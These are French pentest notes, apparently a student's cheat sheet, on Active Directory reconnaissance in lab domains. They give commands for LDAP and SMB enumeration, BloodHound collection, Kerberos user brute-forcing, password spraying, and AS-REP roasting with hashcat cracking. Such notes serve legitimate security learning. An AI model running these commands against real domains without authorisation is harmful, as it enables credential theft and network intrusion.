# Resources
https://openclassrooms.com/fr/courses/7723396-assurez-la-securite-de-votre-active-directory-et-de-vos-domaines-windows/7944459-tirez-un-maximum-de-ce-cours 

# Reconnaissance
Scanning & Enumeration
## Scan nmap classique
## Scan Netbios
Scan extrêmement rapide qui permet de faire un lien entre ip et nom des machines.
L'outil nbtscan permet ce type de scan.
```console
nbtscan 10.0.0.0/16 
```
Il est ensuite possible de faire des scans plus précis sur les machines qui nous intéressent. 

## scan crackmapexec
```bash
proxychains cme smb 192.168.3.201-203
```
Si certains hôtes ont la signature smb de désactivé, cela peut permettre des attaque par smb relai.


## ldapsearch
L’utilitaire ldapsearch (page du manuel Idapsearch) permet d’effectuer des requêtes vers un serveur LDAP, il permet donc de demander anonymement à un contrôleur de domaine des informations sur le domaine.
```console
ldapsearch -x ldap://<controleurDeDomaine ou @ip> -s base -LLL
```
![Tableau correspondance de version](../img/Windows/correspondance_version.png)


L’entrée rootDomainNamingContext indique le nom du domaine racine de la forêt. Il se peut qu’il soit similaire au domaine que vous auditez, ce qui signifie que vous êtes dans le domaine racine. Il y a de grandes chances pour que ce soit alors le seul domaine de la forêt.

## Enumération des controleurs de domaine
Pour énumérer l’ensemble des contrôleurs de domaine, l’utilitaire nslookup sera d’une grande aide. Chercher les enregistrements DNS ayant en sous-domaine _kerberos._tcp, qui est propre aux contrôleurs de domaine.
```console
nslookup -type=SRV _kerberos._tcp.<domaine>
```
Si le nom du domaine est inconnu: 
On peut faire un scan nmap sur le port 88 qui est celui de kerberos.

## Enumération d'autorités de certification racine
```console
certipy find 'medic.ex/pixis:P4ssw0rd@dc01.medic.ex'
```

## Recherche du serveur DNS 
```console
nslookup medic.ex
```
## Recherche de points de vulnérabilité
### Recherche serveurs d'impression
```console
nmap -p 9100,515,631 10.10.10.0/24 -n -Pn
```
*-n désactive le DNS et -Pn la découverte basé sur icmp qui eut poser problème en cas d'utilisation de proxychains.*

#### Recherche et exploitation de service d'impression
proxychains rpcdump.py 192.168.3.202 | grep -A2 -B2 MS-RPRN
Use printerbug pour déclencher l'autjentification sur le service. https://github.com/dirkjanm/krbrelayx
Only LANMAN and NTLMv1 hashes from Responder can be cracked by crack.sh
See Hades writeup and https://crack.sh/netntlm/

### Serveurs SCCM
SCCM (System Center Configuration Manager) est une solution proposée par Microsoft, qui permet notamment de gérer les applications et mises à jour d’un parc. Parmi ses nombreuses fonctionnalités, SCCM permet de déployer des applications, des mises à jour, des configurations d’applications ou de services, et permet aussi d’avoir un inventaire du parc informatique. Pour que cela soit possible, SCCM doit avoir également une vue dégagée du réseau, et possède souvent des droits privilégiés sur les machines administrées. Si vous arrivez à prendre la main sur un serveur SCCM, vous pourrez découvrir de nouveaux sous-réseaux, et potentiellement compromettre de nouveaux postes.

### Serveurs WSUS
Les serveurs WSUS (Windows Server Update Services) permettent aux administrateurs de déployer des mises à jour Microsoft sur l’ensemble des machines du parc. De par leur rôle, ces serveurs ont très souvent une visibilité complète sur l’ensemble du réseau. Compromettre un serveur WSUS vous permettra alors de rebondir sur le reste du réseau aisément. 

### Serveurs SCOM
Enfin, les serveurs SCOM (System Center Operations Manager) permettent de surveiller la performance et les événements de systèmes Windows. Ils permettent notamment de superviser un Active Directory, des bases de données MSSQL, ou encore des serveurs Exchange. De la même manière que les solutions précédentes, un serveur SCOM doit avoir une visibilité sur les serveurs supervisés pour parvenir à ses fins. Il peut également avoir des droits privilégiés sur certains d’entre eux.


### Récupérer la politique de mot de passe
A utiliser dans powershell
```powershell
Get-ADDefaultDomainPasswordPolicy
```
Exemple:  
```text
ComplexityEnabled           : True
DistinguishedName           : DC=medic,DC=ex
LockoutDuration             : 00:10:00
LockoutObservationWindow    : 00:30:00
LockoutThreshold            : 3
MaxPasswordAge              : 90.00:00:00
MinPasswordAge              : 1.00:00:00
MinPasswordLength           : 7
objectClass                 : {domainDNS}
objectGuid                  : dae14cb7-a84e-4d1d-8490-27399d6fbad5
PasswordHistoryCount        : 24
ReversibleEncryptionEnabled : False
```
Cette politique de mot de passe impose un mot de passe d’au moins 7 caractères (MinPasswordLength) et une complexité minimale, via le paramètreComplexityEnabled. Dans un intervalle de 30 minutes (LockoutObservationWindow), le compte sera bloqué après 3 tentatives erronées d’authentification (  LockoutThreshold  ). Il sera automatiquement débloqué après 10 minutes (LockoutDuration). Enfin, le mot de passe doit être modifié au moins tous les 90 jours (  MaxPasswordAge  ).

### Recherche d'information sensible
```powershell
Get-ADObject -LDAPFilter "(|(ObjectClass=user)(ObjectClass=computer))" -SearchBase "DC=MEDIC,DC=EX" -Property * |  where description -ne $null | Select Name, Description, ObjectClass
```
Permet de récupérer la liste des utilisateurs ainsi que leur description. Les descriptions cachent parfois des mdp temporaire par exemple.

ldapdomaindump permet de faire la même chose
```console
ldapdomaindump -u ‘medic.ex\pixis’ -p P4ssw0rd dc01.medic.ex
```

### Recherche d'utilisateurs à cibler
- administrateurs de l’entreprise : c’est le groupe d’administration le plus élevé. Dans une forêt comportant plusieurs domaines, il sera automatiquement ajouté au groupe d’administration de chaque domaine ;
- admins du domaine : présent dans chaque domaine, ce groupe est administrateur local de tous les postes du domaine ;
- administrateurs : ce groupe est également propre à chaque domaine. Il a des droits élevés sur toutes les opérations liées au domaine, notamment sur les contrôleurs de domaine.

Autres groupes privilégiés:  
https://docs.microsoft.com/fr-fr/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory#built-in-privileged-accounts-and-groups 

L'outil bloodhound permet de visualiser l'appartenance des utilisateurs à différents groupes.

Pour collecter les informations sur l’Active Directory, il faut utiliser SharpHound depuis une session authentifiée. Si vous êtes sur une machine du domaine, vous pouvez lancer l’outil sans argument. Si en revanche vous êtes sur votre machine d’attaque, il faudra dans un premier temps vous mettre dans le contexte d’un utilisateur du domaine avec l’utilitaire RunAs

```console
runas /netonly /user:medic.ex\pixis cmd.exe
.\SharpHound.exe
```

Alternative:
```bash
proxychains bloodhound-python -u bob -p 'Passw0rd1!' -d htb.local -ns 192.168.3.203 --dns-tcp -c All
```


- htb.local = nom de domaine
- bob = nom d'utilisateur testé
- Passw0rd1! = mot de passe de l'utilisateur
- 192.168.3.203 = adresse ip du controleur de domaien


*Si vous rencontrez des problèmes lors de l’exécution de SharpHound depuis votre propre machine, veillez à ce que les paramètres réseau de votre machine virtuelle soient correctement configurés. Mettez l’adresse IP d’un contrôleur de domaine comme serveur DNS, et paramétrez le nom de domaine comme suffixe DNS. Vous pouvez également renseigner les paramètres --domain et --domaincontroller lors de l'exécution de SharpHound afin de lui préciser explicitement le nom du domaine que vous souhaitez analyser, ainsi qu'un contrôleur de domaine que vous avez identifié. *

Quand l’outil termine de récolter les informations, il produit un fichier ZIP qu’il est possible d’importer dans BloodHound.

### Dump anonyme du ldap - Enumération d'utilisateurs
```bash
./windapsearch-linux-amd64 -d 192.168.3.203 -m users --proxy 127.0.0.1:1080
```
- où 192.168.3.203 est l'adresse du controleur de domaine  
- et --proxy précise l'adresse et le port de la connection socks chisel

### Bruteforce kerberos - Enumération d'utilisateurs
Utilisation du dictionnaire names.txt fourni par la secList recommandé.
Depuis une machine rebond linux
```console
./kerbrute userenum names.txt -d htb.local --dc 192.168.3.203
```

### Recherche de mots de passe faibles
!Il faut faire attention à la politique de mot de passe.
L'outil sprayhound permet de tester sur le domaine si un mot de passe est utilisé par plusieurs utilisateurs
```console
sprayhound -U ./utilisateurs.txt -p <mdp> -d medic.ex -dc 10.10.10.2
```
On peut tester également les mots de passe identique au nom d'utilisateur. En fournissant une liste de nom d'utilisateur avec -U
```console
sprayhound -U ./utilisateurs.txt -d medic.ex -dc 10.10.10.2
```

### AS-REP Roasting
Each time an object authenticates to the domain over Kerberos, a timestamp is encrypted with
the user's password and sent to the DC (known as AS-REQ). The DC then decrypts this data to
determine if the password is correct is not. After this the DC responds with an AS-REP, a part of which is encrypted with the user's password. This process is known as pre-authentication, and serves as a protection against online bruteforce.  
However, in the event where a user's pre-authentication is disabled, any user can send an AS-REQ request for the account and receive its AS-REP data. This data can then be subjected to an offline bruteforce attack where we can attempt to crack the user's password.
```bash
proxychains GetNPUsers.py htb.local/bob@dc1.htb.local -dc-ip 192.168.3.203 -no-pass
```
- htb.local = nom de domaine
- bob = nom d'utilisateur testé
- dc1.htb.local = nom du controleur de domaine
- -dc-ip 192.168.3.203 = adresse du controleur de domaine

#### Cracking AS-REP
Si GetNPUsers retourne une chaine de caractère, on peut tenter de la craquer avec hashcat:
```bash
hashcat -m 18200 -a 0 .\<path>.hash /usr/share/wordlists/rockyou.txt
```

### Cartographier les partages réseau (smb)
Les partages réseau sous Windows utilisent le protocole SMB pour les échanges de fichiers. Ce service est en écoute sur le port 445.
On peut vérifier les partages réseau accessibles par un utilisateur avec la commande suivante:
```console
cme smb 10.10.10.0/24 -u pixis -p P4ssw0rd -d medic.ex --shares
```

#### Connexion à un partage réseau distant (smb)
```bash
proxychains smbclient.py 'htb.local/bob:Passw0rd1!@192.168.3.203'
```
- htb.local = nom de domaine
- bob = nom d'utilisateur testé
- Passw0rd1! = mot de passe de l'utilisateur
- 192.168.3.203 = adresse ip du serveur smb
Puis utilisation de la commande
```bash
use <nom_share>
```



### crackmapexec
l'outil crackmapexec permet de réaliser de nombreux types de scan :
https://wiki.porchetta.industries/smb-protocol/scan-for-vulnerabilities



# Exploitation (Gaining Access)
# Privilege Escalation




# Command & Control (Persistence/Maintaining Access)
# Clearing Tracks (usually not necessary in CTF’s, but good practice)


